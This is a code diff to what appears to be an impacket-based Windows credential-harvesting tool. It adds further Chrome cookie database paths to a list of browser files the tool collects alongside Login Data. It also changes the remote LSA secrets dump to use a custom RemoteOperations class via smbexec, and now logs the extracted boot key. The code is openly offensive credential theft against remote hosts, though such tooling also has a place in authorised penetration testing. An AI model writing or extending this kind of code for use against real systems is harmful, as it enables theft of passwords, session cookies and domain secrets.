@@ -12,6 +12,7 @@ from lib.certificates import CertificatesTriage
 
 from lib.secretsdump import LSASecrets as MyLSASecrets
 from lib.secretsdump import SAMHashes as MySAMHashes
+from lib.secretsdump import RemoteOperations as MyRemoteOperations
 import socket,impacket
 
 from impacket.dcerpc.v5 import srvs
@@ -387,6 +388,9 @@ class MySeatBelt:
 
 		user_directories = [("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data", 'Local State', 'ChromeLocalState', 'DOMAIN'),
 							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Cookies', 'ChromeCookies', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Extension Cookies', 'ChromeCookies', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network", 'Cookies', 'ChromeCookies', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Safe Browsing Network", 'Safe Browsing Cookies', 'ChromeCookies', 'DOMAIN'),
 							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data', 'ChromeLoginData', 'DOMAIN'),
 							]
 
@@ -1764,11 +1768,12 @@ class MySeatBelt:
 			#Remove logging
 			#logging.getLogger().setLevel(logging.CRITICAL)
 			self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE} [+] Dumping LSA Secrets{bcolors.ENDC}")
-			self.__remoteOps = RemoteOperations(self.smb, self.options.k, self.options.dc_ip)
+
+			self.__remoteOps = MyRemoteOperations(self.smb, self.options.k, self.options.dc_ip)
 			self.__remoteOps.setExecMethod('smbexec')
 			self.__remoteOps.enableRegistry()
 			self.__bootKey = self.__remoteOps.getBootKey()
-			self.logging.debug("bootkey")
+			self.logging.debug(f"bootkey: {self.__bootKey}")
 			SECURITYFileName = self.__remoteOps.saveSECURITY()
 			self.logging.debug("savesecurity")
 			self.__LSASecrets = MyLSASecrets(SECURITYFileName, self.__bootKey, self.__remoteOps,isRemote=True, history=True)
